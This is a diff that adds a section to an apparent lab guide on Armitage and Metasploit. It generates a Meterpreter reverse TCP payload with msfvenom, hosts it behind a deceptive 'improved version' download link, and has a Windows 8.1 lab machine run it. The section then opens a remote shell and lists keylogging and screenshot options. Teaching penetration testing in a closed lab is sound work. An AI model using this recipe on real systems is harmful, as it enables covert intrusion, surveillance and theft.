@@ -169,3 +169,91 @@ In this lab we show the use of the Social Engineering Toolkit (SET), Metasploit,
 7. We can now close the terminal.
    
 #### 3. Using Armitage
+##### 3.1 Preparation
+1. Open a terminal in Kali and list available reverse TCP payloads for Windows:
+    ```
+    sudo msfvenom -l payloads | grep windows | grep reverse_tcp
+    ```
+
+2. Then run the following command to create a reverse TCP payload, which will generate a metPayload.exe payload and place it in the Apache web server directory:
+    ```
+    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.4 LPORT=444 -f exe -o /var/www/html/metPayload.exe
+    ```
+3. Navigate to the Apache web server directory:
+    ```
+    cd /var/www/html
+    ```
+
+4. Edit the index.html file using vim:
+    ```
+    sudo vim index.html
+    ```
+
+5. Add the following text below the existing payload link:
+    ```
+    <p>THIS IS AN IMPROVED VERSION</p>
+    <a href="metPayload.exe">Download the improved version</a>
+    ```
+6. Save and exit Vim, Press ESC, then type :wq and press Enter.
+
+##### 3.2 Start Armitage
+1. Start Armitage by running:
+    ```
+    sudo armitage
+    ```
+2. In the Armitage window, click `Connect`.
+3. If a message appears stating Metasploit server is not running, click `Yes` to start it.
+4. If a database connection error occurs:
+    - Open a terminal and run:
+    ```
+    msfdb init
+    ```
+5. Open Armitage again and follow the same steps from 1 to 3
+   
+##### 3.3 Set Up the Exploit in Armitage   
+1. In the upper-left panel, navigate to:
+   - Windows -> x64 -> Meterpreter -> reverse_tcp.
+2. Double-click on `reverse_tcp`.
+3. Set the following parameters:
+   - LHOST: 192.168.56.4
+   - LPORT: 444
+4. Click `Launch` to start the exploit.
+
+##### 3.4 Execute the Payload on the Windows Machine
+1. On the Windows 8.1 machine:
+   -  Open a web browser and navigate to http://192.168.56.4.
+2. Download the improved version (metPayload.exe).
+3. Locate the downloaded file, right-click it, and select Properties.
+4. In the Properties window:
+    - Click Unblock, then Apply, and OK.
+5. Run the metPayload.exe file.
+
+##### 3.5 Interact with the Compromised Machine
+1. In Armitage, a new session will appear representing the compromised machine.
+2. Right-click the session and select Interact -> Meterpreter Shell.
+3. Run commands in the shell:
+    - List files in the current directory:
+        ```
+        dir
+        ```
+   - Explore running processes:
+        ```
+        wmic process list brief
+        ```
+##### 3.6 Post-Exploitation Options
+1. Right-click the session and explore additional options:
+    - Log Keystrokes: Capture keystrokes.
+    - Take Screenshots: Take screenshots of the target machine.
+2. Explore files and data as required.
+
+
+##### 3.7 Cleanup
+1. Exit the Meterpreter session:
+    ```
+    exit
+    ```
+2. Stop the Apache server:
+    ```
+    sudo service apache2 stop
+    ```
+
